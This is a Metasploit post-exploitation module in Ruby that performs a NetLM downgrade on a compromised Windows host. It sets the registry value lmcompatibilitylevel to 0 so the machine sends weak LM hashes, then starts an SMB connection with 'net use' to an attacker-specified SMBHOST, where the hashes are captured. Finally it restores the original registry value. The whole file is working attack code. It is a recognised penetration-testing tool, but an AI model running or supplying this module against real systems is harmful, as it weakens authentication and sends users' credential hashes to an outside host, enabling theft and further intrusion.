##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

	include Msf::Post::Windows::Registry
	include Msf::Post::Windows::WindowsServices
	include Msf::Post::Windows::Priv

	def initialize(info={})
		super(update_info(info,
			'Name'           => 'Windows NetLM Downgrade Attack',
			'Description'    => %q{ This module will change a registry value to enable
				the sending of LM challenge hashes and then initiate a SMB connection to
				the SMBHOST datastore. If an SMB server is listening, it will receive the
				NetLM hashes
				},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Brandon McCann "zeknox" <bmccann [at] accuvant.com>',
					'Thomas McCarthy "smilingraccoon" <smilingraccoon [at] gmail.com>'
				],
			'SessionTypes'   => [ 'meterpreter' ],
			'References'     =>
				[
					[ 'URL', 'http://www.fishnetsecurity.com/6labs/blog/post-exploitation-using-netntlm-downgrade-attacks']
				]
		))

		register_options(
			[
				OptAddress.new('SMBHOST', [ true, 'IP Address where SMB host is listening to capture hashes.' ])
			], self.class)
	end

	# method to make smb connection
	def smb_connect
		begin
			print_status("Establishing SMB connection to " + datastore['SMBHOST'])
			cmd_exec("cmd.exe","/c net use \\\\#{datastore['SMBHOST']}")
			print_good("The SMBHOST should now have NetLM hashes")
		rescue
			print_error("Issues establishing SMB connection")
		end
	end

	# if netlm is disabled, enable it in the registry
	def run
		# if running as SYSTEM exit
		if is_system?
			# running as SYSTEM and will not pass any network credentials
			print_error "Running as SYSTEM, should be run as valid USER"
			return
		end

		subkey = "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\"
		v_name = "lmcompatibilitylevel"
		netlm = registry_getvaldata(subkey, v_name)
		if netlm.nil?
			print_error("Issues enumerating registry values")
			return
		end

		if netlm == 0
			print_status("NetLM is already enabled on this system")

			# call smb_connect method to pass network hashes
			smb_connect
		else

			print_status("NetLM is Disabled: #{subkey}#{v_name} == #{netlm.to_s}")
			v = registry_setvaldata(subkey,v_name,0,"REG_DWORD")
			if v.nil?
				print_error("Issues modifying registry value")
				return
			end

			post_netlm = registry_getvaldata(subkey, v_name)
			if post_netlm.nil?
				print_error("Issues enumerating registry values")
				return
			end

			print_good("NetLM is Enabled:  #{subkey}#{v_name} == #{post_netlm.to_s}")

				# call smb_connect method to pass network hashes
			smb_connect

			# cleanup the registry
			v = registry_setvaldata(subkey,v_name,netlm,"REG_DWORD")
			if v
				print_status("Cleanup Completed: #{subkey}#{v_name} == #{netlm.to_s}")
			else
				print_error("Issues cleaning up registry changes")
				return
			end

		end
	end
end
